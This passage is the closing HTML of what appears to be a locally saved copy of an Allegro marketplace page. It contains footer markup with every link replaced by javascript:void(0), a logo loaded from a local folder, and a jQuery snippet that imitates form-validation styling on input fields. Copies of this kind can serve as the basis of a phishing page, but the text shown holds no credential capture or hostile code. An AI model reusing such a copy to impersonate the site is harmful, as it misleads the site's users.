0"></feColorMatrix></filter></svg> <ul class="cb2a5_27PGq"><li><a class=" _183de _nit1c cb2a5_Cdl_I cb2a5_1qU7t cb2a5_1YFrf " href="javascript:void(0)">AppStore</a></li><li><a class=" _183de _w8stw cb2a5_Cdl_I cb2a5_2_gzL cb2a5_1YFrf " href="javascript:void(0)" >GooglePlay</a></li></ul></div></div></div><div class="e8a20_2iPrm _3kk7b _vnd3k _1h8s6 _cdwuq _alw8w _1h2yi"><div data-box-name="f-social-icons2" data-prototype-id="allegro.socialButtons" data-prototype-version="1.3" data-skin-class-name="social-buttons" data-implementation-version="0.9.1"  data-analytics-category="allegro.socialButtons"   data-visible-for="147"><a name="f-social-icons2"></a><div class="cb2a5_1fncB  cb2a5_3H3C3 " data-role=""><svg width="0" height="0"><filter id="social-filter-teal" color-interpolation-filters="sRGB"><feColorMatrix values="0 0 0 0 0.4625 0 0 0 0 0.4625 0 0 0 0 0.4625 0 0 0 1 0"></feColorMatrix></filter></svg> <ul class="cb2a5_27PGq"><li><a class=" _183de _16fpl cb2a5_Cdl_I   " href="javascript:void(0)">Facebook</a></li><li><a class=" _183de _1diq3 cb2a5_Cdl_I   " href="javascript:void(0)">LinkedIn</a></li><li><a class=" _183de _1fo1f cb2a5_Cdl_I   " href="javascript:void(0)">Instagram</a></li><li><a class=" _183de _199ve cb2a5_Cdl_I   " href="javascript:void(0)">Pinterest</a></li><li><a class=" _183de _1bnjm cb2a5_Cdl_I   " href="javascript:void(0)">YouTube</a></li><li><a class=" _183de _13b16 cb2a5_Cdl_I   " href="javascript:void(0)">Charytatywni Allegro</a></li></ul></div></div></div></div></div> </div></div></div> </div></div></div></div></div></div> </div></div></div><div data-box-name="f-base"    ><a name="f-base"></a><div class="_26e29_3TEPn v2144 _26e29_1bLR9 opbox-sheet-wrapper _26e29_ix2OZ full-width ">  <div class="_26e29_2IhX3 opbox-sheet " style="background: #3a4e58;"> <div data-box-name="f-base-wrapper"    ><a name="f-base-wrapper"></a><div class="_26e29_3TEPn v2144 _26e29_1bLR9 opbox-sheet-wrapper ">  <div class="_26e29_2IhX3 opbox-sheet _26e29_2fPDv card " style=""> <div data-box-name="f-base-columns" data-prototype-id="layout.grid" data-prototype-version="5.0" data-implementation-version="1.8.0" data-analytics-category="layout.grid"  ><a name="f-base-columns"></a><div class="_1yyhi e8a20_2xBJD e8a20_1wuG8"><div class="e8a20_2iPrm _3kk7b _t0xzz e8a20_4N95r"><div data-box-name="f-base-info" data-prototype-id="allegro.richText"  data-implementation-version="2.3.1"  data-analytics-category="allegro.richText"  ><a name="f-base-info"></a><div class=" _5c3c4_1q7VO rich-text _5c3c4_18cHW "><p class="_r5ckd _5c3c4_1bvJH"><span style="color:#ffffff;">Korzystanie z serwisu oznacza akceptację</span> <a href="javascript:void(0)" name="" role="" class="_sm3us" rel="follow,noopener">regulaminu</a></p></div></div></div><div class="e8a20_2iPrm _3kk7b e8a20_2XlIO e8a20_bvoJE e8a20_1N-dJ e8a20_YW3c7 e8a20_32ZUY e8a20_4N95r"><div data-box-name="f-base-empty-space" data-prototype-id="allegro.richText"  data-implementation-version="2.3.1"  data-analytics-category="allegro.richText"  ><a name="f-base-empty-space"></a><div class=" _5c3c4_1q7VO rich-text _5c3c4_18cHW "><p class="_r5ckd _5c3c4_1bvJH">&nbsp; <br></p></div></div></div><div class="e8a20_2iPrm _3kk7b e8a20_2CqoD e8a20_1sfLr e8a20_2Q4tO e8a20_1dUcK e8a20_1xO_b e8a20_4N95r"><div data-box-name="f-base-logo" data-prototype-id="allegro.richText"  data-implementation-version="2.3.1"  data-analytics-category="allegro.richText"  ><a name="f-base-logo"></a><div class=" _5c3c4_1q7VO rich-text _5c3c4_18cHW "><p class="_r5ckd _5c3c4_1bvJH" style="text-align:right;"><a href="javascript:void(0)" name="" role="" target="_self" class="_sm3us" rel="follow,noopener"><img class="_r5ckd _5c3c4_gRCuS" src="./all_pliki/allegro-1.svg" alt="Allegro" width="116" height="40"></a></p></div></div></div></div></div> </div></div></div> </div></div></div> </div></div></div>
</div>


<script>
$('.m-field__input').keyup(function() {
	if($(this).val().length >= 1) {
		$(this).removeClass("ng-empty ng-invalid ng-invalid-required placeholder-shown").addClass("ng-not-empty ng-valid ng-valid-required");
	} else {
		$(this).addClass("ng-empty ng-invalid ng-invalid-required placeholder-shown").removeClass("ng-not-empty ng-valid ng-valid-required");
	}
});
</script>


</body></html>